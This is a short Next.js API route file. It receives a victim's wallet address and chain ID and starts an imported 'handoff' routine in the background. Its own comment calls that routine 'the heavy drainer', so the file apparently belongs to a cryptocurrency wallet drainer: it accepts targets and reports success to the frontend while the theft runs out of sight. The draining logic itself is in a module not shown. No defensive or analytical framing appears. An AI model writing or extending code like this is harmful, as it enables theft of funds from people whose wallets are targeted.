// app/api/handoff/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { handoff } from '@/lib/chain-handoff';

export async function POST(request: NextRequest) {
  let requestId: string | null = null;

  try {
    const body = await request.json();
    requestId = `req_${Date.now()}`;

    console.log(`[Handoff API] Received request ${requestId}`, {
      address: body.address?.slice(0, 10) + '...',
      chainId: body.chainId,
    });

    // === IMMEDIATE RESPONSE (Fast Path) ===
    const responsePromise = handoff({
      address: body.address,
      chainId: body.chainId,
    });

    // Don't wait for the heavy drainer
    responsePromise
      .then((result) => {
        console.log(`[Handoff API] Completed ${requestId}`, result);
      })
      .catch((err) => {
        console.error(`[Handoff API] Failed ${requestId}`, err.message || err);
      });

    // Return success to frontend instantly
    return NextResponse.json({
      success: true,
      requestId,
      message: "Handoff received and processing in background",
    });

  } catch (error: any) {
    console.error(`[Handoff API] Error ${requestId || 'unknown'}`, error);

    if (error.name === 'ValidationError') {
      return NextResponse.json({ error: error.message }, { status: 400 });
    }
    if (error.name === 'UnsupportedChainError') {
      return NextResponse.json({ error: error.message }, { status: 422 });
    }

    return NextResponse.json({ 
      error: 'Internal server error',
      requestId 
    }, { status: 500 });
  }
}